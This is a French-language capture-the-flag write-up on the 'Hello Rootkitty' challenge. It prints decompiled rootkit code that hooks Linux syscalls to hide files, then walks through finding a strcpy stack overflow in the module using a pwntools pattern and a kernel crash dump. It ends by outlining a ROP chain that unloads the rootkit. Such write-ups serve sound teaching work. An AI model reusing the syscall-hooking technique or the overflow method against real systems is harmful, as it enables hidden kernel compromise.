# Hello Rootkitty 

## intitulé

> Une machine a été infectée par le rootkit Hello Rootkitty qui empêche la lecture de certains fichiers.
> Votre mission : aider la victime à récupérer le contenu des fichiers affectés. Une fois connecté en SSH, lancez le wrapper pour démarrer le challenge.

## Fichiers fournis
[bzImage](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/bzImage) le kernel linux
[ecsc.ko](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/ecsc.ko) le rootkit sous forme de module kernel 
[initramfs.example.cpio](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/binaries/initramfs.example.cpio) Le système de fichier

Au vu des fichiers, on peut s'imaginer qu'on va devoir exploiter une vulnérabilité kernel.

## Analyse
Après avoir lancé le wrapper mentionné dans l'intitulé, on se rend compte que les fichiers commençants par "ecsc_flag_" ont un comportement étrange : on ne peut pas visualiser leur contenu et ils sont renommés automatiquement :
```bash
~ $ echo "test" > ecsc_flag_1234
~ $ ls -al~~~~
total 0
drwxrwxrwx    2 ctf      ctf              0 May  4 19:44 .
drwxr-xr-x    3 root     root             0 Feb 25 09:30 ..
-r--------    0 root     root             0 Jan  0  1900 ecsc_flag_XXXX
~ $ cat ecsc_flag_XXXX
cat: can't open 'ecsc_flag_XXXX': No such file or direc****tory
```

à noter qu'ils changent de propriétaire et de date.

En décompilant le module avec [ghidra](https://ghidra-sre.org/)  on comprend un peu mieux ce qu'il se passe :
Les syscalls **lstat**, **getdents**, **getdents64** sont *hookés* :
```c
long init_module(void)

{
  ulong *syscall_table;
  ulong in_CR0;
  
  syscall_table = (ulong *)kallsyms_lookup_name("sys_call_table");
  ref_sys_getdents64 = syscall_table[0xd9];
  original_cr0 = in_CR0;
  my_sys_call_table = syscall_table;
  syscall_table[0xd9] = (ulong)ecsc_sys_getdents64;
  ref_sys_getdents = syscall_table[0x4e];
  syscall_table[0x4e] = (ulong)ecsc_sys_getdents;
  ref_sys_lstat = syscall_table[6];
  syscall_table[6] = (ulong)ecsc_sys_lstat;
  return 0;
}
```

le syscall [lstat](https://linux.die.net/man/2/lstat)  permet normalement d'afficher les attributs d'un fichier.
les syscalls [getdents](https://linux.die.net/man/2/getdents) et [getdents64](https://linux.die.net/man/2/getdents) permettent d'afficher le nom des fichiers.

Tout s'explique. On va donc étudier de plus près les hooks de ces syscalls, plus particulièrement celui des syscall **getdents** et **getdents64**. Voilà ce que donne la fonction ecsc_sys_getdents64 :
```c
ulong ecsc_sys_getdents64(ulong fd,dirent *dirp,ulong count)

{
  byte *__src;
  ulong result;
  uint *__src_00;
  uint *puVar1;
  uint *puVar2;
  long i;
  uint uVar3;
  uint uVar4;
  ulong Result;
  byte *pbVar5;
  byte *pbVar6;
  ulong uVar7;
  bool bVar8;
  bool bVar9;
  byte bVar10;
  char local_70 [10];
  undefined8 XXXX;
  
  bVar10 = 0;
  result = (*ref_sys_getdents64)();
  Result = result;
  do {
    if ((long)Result < 1) {
      return result;
    }
    uVar7 = (ulong)dirp->d_reclen;
    __src = (byte *)dirp->d_name;
    i = 10;
    bVar8 = Result < uVar7;
    Result = Result - uVar7;
    bVar9 = Result == 0;
    pbVar5 = __src;
    pbVar6 = (byte *)"ecsc_flag_";
    do {
      if (i == 0) break;
      i = i + -1;
      bVar8 = *pbVar5 < *pbVar6;
      bVar9 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (ulong)bVar10 * -2 + 1;
      pbVar6 = pbVar6 + (ulong)bVar10 * -2 + 1;
    } while (bVar9);
    if ((!bVar8 && !bVar9) == bVar8) {
      __src_00 = (uint *)**strcpy**(local_70,(char *)__src);
      puVar2 = __src_00;
      do {
        puVar1 = puVar2;
        uVar3 = *puVar1 + 0xfefefeff & ~*puVar1;
        uVar4 = uVar3 & 0x80808080;
        puVar2 = puVar1 + 1;
      } while (uVar4 == 0);
      bVar8 = (uVar3 & 0x8080) == 0;
      if (bVar8) {
        uVar4 = uVar4 >> 0x10;
      }
      if (bVar8) {
        puVar2 = (uint *)((long)puVar1 + 6);
      }
      Result = (long)puVar2 + (-(long)__src_00 - (ulong)CARRY1((byte)uVar4,(byte)uVar4)) + -0xd;
      if (0x3f < Result) {
        Result = 0x40;
      }
      uVar4 = (uint)Result;
      if (uVar4 < 8) {
        if ((Result & 4) == 0) {
          if ((uVar4 != 0) && (*(undefined *)((long)__src_00 + 10) = 0x58, (Result & 2) != 0)) {
            *(undefined2 *)((long)__src_00 + (Result & 0xffffffff) + 8) = 0x5858;
          }
        }
        else {
          *(undefined4 *)((long)__src_00 + 10) = 0x58585858;
          *(undefined4 *)((long)__src_00 + (Result & 0xffffffff) + 6) = 0x58585858;
        }
      }
      else {
        XXXX = 0x5858585858585858;
        *(undefined8 *)((long)__src_00 + (Result & 0xffffffff) + 2) = 0x5858585858585858;
        uVar4 = uVar4 + (((int)__src_00 + 10) - (int)(__src_00 + 4)) & 0xfffffff8;
        if (7 < uVar4) {
          uVar3 = 0;
          do {
            Result = (ulong)uVar3;
            uVar3 = uVar3 + 8;
            *(undefined8 *)((long)(__src_00 + 4) + Result) = 0x5858585858585858;
          } while (uVar3 < uVar4);
        }
      }
      **strcpy**((char *)__src,(char *)__src_00);
      return result;
    }
    dirp = (dirent *)((long)&dirp->d_ino + uVar7);
  } while( true );
}
```

Sans s'attarder sur les détails on voit que :
1. le syscall original est appelé,
2. si le fichier débute par "ecsc_flag_", la suite du nom de fichier est remplacé par de "X"
3. la fonction fait des appels à **strcpy**, ce qui est très dangereux et peut provoquer des buffers overflow. D'une manière générale, on ne fait jamais appel à ces fonctions dans le kernel et les modules, en pivilegiant plutôt les fonctions comme [copy_from_user](https://www.kernel.org/doc/htmldocs/kernel-api/API---copy-from-user.html) par exemple.

Afin de tester la vulnérabilité et de connaitre l'offset pour lequel on overwrite la rip, nous allons faire appel à pwn tools :
```python
Python 2.7.17 (default, Apr 15 2020, 17:20:14) 
[GCC 7.5.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(150)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma'
>>> 
```
puis :
```bash
cd /home/ctf
touch ecsc_flag_aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
ls -l
```

En résulte un crash kernel :
```
general protection fault: 0000 [#1] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 53 Comm: ls Tainted: G           O    4.14.167 #11
task: ffff932d81e19980 task.stack: ffff9ac3c009c000
RIP: 0010:0x6163626161626261
RSP: 0018:ffff9ac3c009ff38 EFLAGS: 00000282
RAX: 00000000000000e8 RBX: 6174616161736161 RCX: 0000000000000000
RDX: 00007fff048b3bd4 RSI: ffff9ac3c009ff61 RDI: 00007fff048b3b33
RBP: 617a616161796161 R08: ffff9ac3c009fed0 R09: ffffffffc00d7024
R10: ffff9ac3c009fec0 R11: 6161666261616562 R12: 6176616161756161
R13: 6178616161776161 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffffb9836000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007fff048b3af0 CR3: 0000000001e98000 CR4: 00000000000006b0
Call Trace:
Code:  Bad RIP value.
RIP: 0x6163626161626261 RSP: ffff9ac3c009ff38
---[ end trace 85871824b1c07ee4 ]---
Kernel panic - not syncing: Fatal exception
Kernel Offset: 0x37e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
Rebooting in 1 seconds..
```
Bingo ! pwntools nous donne l'offset en question (Notez la valeur de RIP) :
```python
>>> cyclic_find(p64(0x6163626161626261))
102
```

## Exploit
On s'oriente donc vers un "simple" bufferoverflow. Ne sachant pas l'addresse de la stack et le kernel utilisé étant probablement assez recent, on va devoir utiliser une [ropchain](https://en.wikipedia.org/wiki/Return-oriented_programming). 

Notre ropchain va d'abord appeller la fonction **cleanup_module** (qui fait exactement l'inverse de la fonction **init_module** mentionnée plus haut, à savoir qu'elle restaure la table des syscalls afin que les fonctions originales du noyau soient utilisés). Puis on va dépiler la stack jusqu'à obtenir l'addresse de retour initial (dans **do_syscall_64**, la fonction qui gère les syscall). Le kernel reprendra donc un fonctionnement à peu près normal. Le but de la ropchain n'étant pas de passer root, mais de désactiver le rootkit. Un simple `cat /ecsc_flag_*` affichera le flag après passage de notre exploit.

Voici le [code de mon exploit](https://github.com/gw3l/FCSC-2020-Writeups/blob/master/exploit.c).


